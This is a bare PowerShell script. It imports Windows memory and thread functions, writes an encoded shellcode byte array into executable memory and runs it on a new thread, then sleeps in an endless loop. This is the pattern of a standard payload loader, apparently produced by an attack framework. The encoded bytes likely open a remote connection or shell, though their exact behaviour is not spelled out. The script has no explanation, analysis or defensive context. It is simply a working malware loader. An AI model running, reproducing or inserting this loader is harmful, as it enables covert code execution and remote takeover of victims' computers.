$urF = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $urF -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x36,0xb7,0xd8,0x4b,0xda,0xda,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x42,0x13,0x03,0x42,0x13,0x83,0xea,0xca,0x55,0x2d,0xb7,0xda,0x18,0xce,0x48,0x1a,0x7d,0x46,0xad,0x2b,0xbd,0x3c,0xa5,0x1b,0x0d,0x36,0xeb,0x97,0xe6,0x1a,0x18,0x2c,0x8a,0xb2,0x2f,0x85,0x21,0xe5,0x1e,0x16,0x19,0xd5,0x01,0x94,0x60,0x0a,0xe2,0xa5,0xaa,0x5f,0xe3,0xe2,0xd7,0x92,0xb1,0xbb,0x9c,0x01,0x26,0xc8,0xe9,0x99,0xcd,0x82,0xfc,0x99,0x32,0x52,0xfe,0x88,0xe4,0xe9,0x59,0x0b,0x06,0x3e,0xd2,0x02,0x10,0x23,0xdf,0xdd,0xab,0x97,0xab,0xdf,0x7d,0xe6,0x54,0x73,0x40,0xc7,0xa6,0x8d,0x84,0xef,0x58,0xf8,0xfc,0x0c,0xe4,0xfb,0x3a,0x6f,0x32,0x89,0xd8,0xd7,0xb1,0x29,0x05,0xe6,0x16,0xaf,0xce,0xe4,0xd3,0xbb,0x89,0xe8,0xe2,0x68,0xa2,0x14,0x6e,0x8f,0x65,0x9d,0x34,0xb4,0xa1,0xc6,0xef,0xd5,0xf0,0xa2,0x5e,0xe9,0xe3,0x0d,0x3e,0x4f,0x6f,0xa3,0x2b,0xe2,0x32,0xab,0x98,0xcf,0xcc,0x2b,0xb7,0x58,0xbe,0x19,0x18,0xf3,0x28,0x11,0xd1,0xdd,0xaf,0x56,0xc8,0x9a,0x20,0xa9,0xf3,0xda,0x69,0x6d,0xa7,0x8a,0x01,0x44,0xc8,0x40,0xd2,0x69,0x1d,0xfc,0xd7,0xfd,0x5e,0xa9,0xd8,0x9b,0x36,0xa8,0xd8,0x70,0x03,0x25,0x3e,0x26,0xdb,0x66,0xef,0x86,0x8b,0xc6,0x5f,0x6e,0xc6,0xc8,0x80,0x8e,0xe9,0x02,0xa9,0x24,0x06,0xfb,0x81,0xd0,0xbf,0xa6,0x5a,0x41,0x3f,0x7d,0x27,0x41,0xcb,0x72,0xd7,0x0f,0x3c,0xfe,0xcb,0xe7,0xcc,0xb5,0xb6,0xa1,0xd3,0x63,0xdc,0x4d,0x46,0x88,0x77,0x1a,0xfe,0x92,0xae,0x6c,0xa1,0x6d,0x85,0xe7,0x68,0xf8,0x66,0x9f,0x94,0xec,0x66,0x5f,0xc3,0x66,0x67,0x37,0xb3,0xd2,0x34,0x22,0xbc,0xce,0x28,0xff,0x29,0xf1,0x18,0xac,0xfa,0x99,0xa6,0x8b,0xcd,0x05,0x58,0xfe,0xcf,0x7a,0x8f,0xc6,0xa5,0x92,0x13;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$rSpB=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($rSpB.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$rSpB,0,0,0);for (;;){Start-sleep 60};